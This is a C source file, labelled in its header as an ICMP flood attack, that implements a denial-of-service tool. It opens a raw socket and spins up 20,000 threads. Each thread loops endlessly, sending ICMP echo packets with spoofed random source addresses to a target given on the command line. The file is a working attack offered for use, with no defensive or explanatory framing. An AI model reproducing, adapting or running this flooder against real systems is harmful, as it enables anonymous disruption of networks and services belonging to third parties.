/*
 *function: flood attack in icmp
 *author: shenya
 *date: 2013-10-29
 */
#include <stdio.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <sys/time.h>
#include <signal.h>
#include <pthread.h>


#define MAX_PTHREAD 20000

pthread_t flood_tid[MAX_PTHREAD];

uint8_t *hostname = NULL;
static unsigned long dest = 0;
static int rawsock;
int alive = 1;

int32_t icmp_cksum(void *data, int length)
{
	int left = length;
	uint16_t *wd = (uint16_t *)data;
	int sum = 0;
	uint16_t temp;

	while(left > 1)
	{
		sum += *wd++;
		left -= 2;
	}
	if(left == 1)
	{
		*((uint8_t *)(&temp)) = *((uint8_t *)wd);
		sum += temp;
	}

	sum = (sum >> 16) + (sum&0xffff);
	sum += (sum >> 16);

	temp = ~sum;

	return temp;
}

static long int ip_random(void)
{
	long int random_ip;
	struct timeval time_now;
	
	gettimeofday(&time_now, NULL);
	srand(time_now.tv_usec);
	//srand(time(0));

	random_ip = random();

	return random_ip;
}

static void Dos_icmp(void)
{
	struct sockaddr_in to;
	struct in_addr addr_temp;

	struct ip *iph;
	struct icmp *icmph;
	char *packet;
	int pktsize = sizeof(struct ip) + sizeof(struct icmp) +64;

	packet = malloc(pktsize);

	iph = (struct ip *)packet;
	icmph = (struct icmp *)(packet + sizeof(struct ip));

	memset(packet, 0, pktsize);

	iph->ip_v = 4;
	iph->ip_hl = 5;
	iph->ip_tos = 0;
	iph->ip_len = htons(pktsize);
	iph->ip_id = htons(getpid());

	iph->ip_off = 0;
	iph->ip_ttl = 0x0;
	iph->ip_p = IPPROTO_ICMP;
	iph->ip_sum = 0;
	//addr_temp.s_addr = inet_addr("127.0.0.1");
	addr_temp.s_addr = ip_random();
	iph->ip_src = addr_temp;
	addr_temp.s_addr = dest;
	iph->ip_dst = addr_temp;
	
	icmph->icmp_type = ICMP_ECHO;
	icmph->icmp_code = 0;

	icmph->icmp_cksum = htons(~(ICMP_ECHO << 8));

	to.sin_family = AF_INET;
	to.sin_addr.s_addr = iph->ip_dst.s_addr;
	to.sin_port = htons(0);

	sendto(rawsock, packet, pktsize, 0, (struct sockaddr *)&to, sizeof(struct sockaddr));

	free(packet);

}

static void *
Dos_fun(void *arg)
{
	while(alive)
	{
					Dos_icmp();
	}
}


int main(int argc, char *argv[])
{
	struct hostent *host = NULL;
	struct protoent *protocol = NULL;		
	char protoname[] = "icmp";
	struct sockaddr_in dest_addr;
	int i;

	if(argc < 2)
	{
		printf("ping aaa.bbb.ccc.ddd\n");
		exit(1);
	}
	protocol = getprotobyname(protoname);
	if(protocol == NULL)
	{
		printf("fail: not support icmp\n");
		exit(1);
	}

	memset(&dest, 0, sizeof(dest));
	memset(&dest_addr, 0, sizeof(dest_addr));

	hostname = argv[1];

	dest = inet_addr(hostname);
	if(dest == INADDR_NONE)
	{

		host = gethostbyname(hostname);
		if(host == NULL)
		{
			printf("fail to gthostbyname");
			exit(1);
		}
		
	//printf("addr is %s\n", inet_ntoa(*((struct in_addr *)host->h_addr)));
		memcpy((char *)&dest_addr.sin_addr, host->h_addr, host->h_length);
  	dest = dest_addr.sin_addr.s_addr;
	}
	rawsock = socket(AF_INET, SOCK_RAW, protocol->p_proto);
	if(rawsock < 0)
	{
		perror("fail to socket");
		exit(1);
	}

	setsockopt(rawsock, SOL_IP, IP_HDRINCL, "1", sizeof("1"));
	

	for(i=0; i<MAX_PTHREAD; i++)
	{
		pthread_create(&flood_tid[i], NULL, Dos_fun, NULL);
	}

#if 0
	for(i=0; i<MAX_PTHREAD; i++)
	{
		pthread_join(flood_tid[i], NULL);
	}

#endif

	
	while(1);
	return 0;

}

